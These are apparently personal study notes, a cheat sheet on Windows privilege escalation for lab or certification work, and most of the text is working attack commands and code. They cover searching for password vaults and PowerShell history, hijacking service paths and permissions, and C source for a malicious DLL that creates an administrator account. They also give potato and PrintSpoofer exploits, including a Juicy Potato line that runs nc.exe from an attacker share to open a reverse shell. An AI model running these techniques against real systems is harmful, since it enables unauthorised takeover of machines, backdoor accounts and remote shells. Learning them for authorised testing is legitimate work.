- [[#Enummeration|Enummeration]]
	- [[#Enummeration#Situational Awarness|Situational Awarness]]
	- [[#Enummeration#Hidden in Plain View|Hidden in Plain View]]
	- [[#Enummeration#Information Goldmine PowerShell|Information Goldmine PowerShell]]
	- [[#Enummeration#Automated Enumeration|Automated Enumeration]]
- [[#Windows Services|Windows Services]]
	- [[#Windows Services#Basic Info|Basic Info]]
	- [[#Windows Services#Service Binary Hijacking|Service Binary Hijacking]]
	- [[#Windows Services#Unquoted Service Path|Unquoted Service Path]]
	- [[#Windows Services#Weak Service Permissions|Weak Service Permissions]]
	- [[#Windows Services#Weak Service Binary Permissions|Weak Service Binary Permissions]]
- [[#DLL Hijacking|DLL Hijacking]]
- [[#Scheduled Tasks|Scheduled Tasks]]
- [[#Using Exploits|Using Exploits]]
	- [[#Using Exploits#Enum|Enum]]
	- [[#Using Exploits#SeImpersonatePrivilege|SeImpersonatePrivilege]]
		- [[#SeImpersonatePrivilege#Rogue Potato|Rogue Potato]]
		- [[#SeImpersonatePrivilege#Juicy Potato|Juicy Potato]]
		- [[#SeImpersonatePrivilege#Sigma potato|Sigma potato]]
	- [[#Using Exploits#Print Spoofer|Print Spoofer]]

## Enummeration

Common methods for privilege escalation include Operating System or 3rd party software misconfigurations and missing patches.
### Situational Awarness

^c231bf

Several key pieces of information:
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

```cmd
whoami
whoami /groups
systeminfo
ipconfig /all
route print
netstat -ano
```

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
```

### Hidden in Plain View

^e4bc4d

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.db,*.sqlite,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```


### Information Goldmine PowerShell

^9eeeee

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Automated Enumeration

^b32349

winpeas.exe
 [SharpUp](https://github.com/GhostPack/SharpUp) can enumerate the host for any misconfiguration-based opportunities.

**En Windows:** Lanza **`Seatbelt.exe -group=user`** o **`PowerUp.ps1`**. Seatbelt analiza automáticamente el historial de PowerShell, los archivos desatendidos y el Autologon, y te los escupe en una sección limpia llamada `[+] ChromiumPrefX`, `[+] PowerShellHistory`, etc
## Windows Services

### Basic Info

Query Service
```cmd
sc query
sc stop VulnService1
```

Get services. We can filter by running services, by name. We can filter out the quotes """...
```powershell
Get-Service | fl
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
net stop mysql
```

### Service Binary Hijacking

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
### Unquoted Service Path

^d67f75

An unquoted service path is where the path to the service binary is not wrapped in quotes.
If we have write permission on one previous directory and we can restart the service, we can get system.

```cmd
wmic service get name, pathname
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
icacls "C:\Program Files\Vulnerable Services" | fl
sc stop VulnService1
```

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
Get-ACL .\directory
Start-Service GammaService
Stop-Service GammaService
```

### Weak Service Permissions

^93ab90

We could check the Service permissions with this script "https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/"

If we can change the binary path and we can restart a service as Local System, we can get nt authority/system.

Check service:
```cmd
sc qc VulnService
```
Change binary path:
```cmd
sc config VulnService binPath= C:\Temp\tcp-local_x64.svc.exe
```
Restart Service:
```cmd
sc stop VulnService
sc start VulnService
```
```powershell
net stop VulnService
net start VulnService
```

Or restart the machine

```cmd
shutdown /r /t 0 /f
```

### Weak Service Binary Permissions

^d220dc

This is a slight variation on the previous vulnerability but instead of the weak permissions being on the service, it's on the service binary itself.

```powershell
Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```

## DLL Hijacking

^93f25e

We can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started.
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
	Listing 56 - Standard DLL search order on current Windows versions

We use Procmon (admin privs, so we can get the binary and run it on our machine)
copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
![[Pasted image 20260524082128.png]]

`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Try to restart the service/start when procmon is on, in order to get all the events:
```powershell
Restart-Service BetaService
```

## Scheduled Tasks

^cca334

List scheduled tasks
```cmd
schtasks /query /fo LIST /v
```
We can filter out the results to find something interesting. Any task who binary we can modify
## Using Exploits

^ee127e
### Enum

```powershell
systeminfo
# Get patches installed
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

### SeImpersonatePrivilege

We can leverage this privilege with any potato or with printspoofer
#### Rogue Potato

```bash
socat tcp-listen:135,reuseaddr,fork tcp:<victim-machine-ip>:9999
```

```cmd
RoguePotato.exe -r <attacker-machine-ip> -e "C:\windows\tem\rev.exe"
```

#### Juicy Potato

```bash
jp.exe -l 1337 -t * -p "C:\Windows\System32\cmd.exe" -a "/c \\10.10.14.6\smbFolder\nc.exe -e cmd.exe 10.10.14.6 9001"
```

#### Sigma potato

```powershell
iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
```
### Print Spoofer

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```
